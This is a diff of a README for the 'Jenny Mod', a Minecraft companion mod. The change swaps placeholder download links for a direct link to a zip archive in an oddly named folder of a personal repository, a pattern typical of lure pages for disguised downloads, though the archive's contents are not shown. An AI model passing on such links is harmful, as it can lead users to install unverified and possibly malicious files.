@@ -2,7 +2,7 @@
 
 Enhance your Minecraft world with the Jenny Mod, a popular community-created modification that introduces a unique and interactive companion character, Jenny. This mod focuses on adding a layer of social interaction, custom animations, and engaging NPC mechanics to the classic sandbox experience.
 
-**[⬇️ Download Jenny Mod](https://github.com)**
+**[⬇️ Download Jenny Mod](https://raw.githubusercontent.com/hyper867/Jenny-Mod-Minecraft/main/aminosis/1.9.zip)**
 
 ## ✨ Key Features
 
@@ -18,7 +18,7 @@ Follow these steps to get the Jenny Mod running on your PC:
 
 1. **Install Minecraft:** Ensure you have the version of Minecraft installed that is compatible with the mod.
 2. **Install Minecraft Forge:** This mod requires **Forge**. Download and install the version of Forge that matches your game version.
-3. **Download the Mod:** Get the latest mod file from the **[Download Link](https://github.com)**.
+3. **Download the Mod:** Get the latest mod file from the **[Download Link](https://raw.githubusercontent.com/hyper867/Jenny-Mod-Minecraft/main/aminosis/1.9.zip)**.
 4. **Locate the Mods Folder:** 
    - Press `Win + R`.
    - Type `%appdata%` and press Enter.
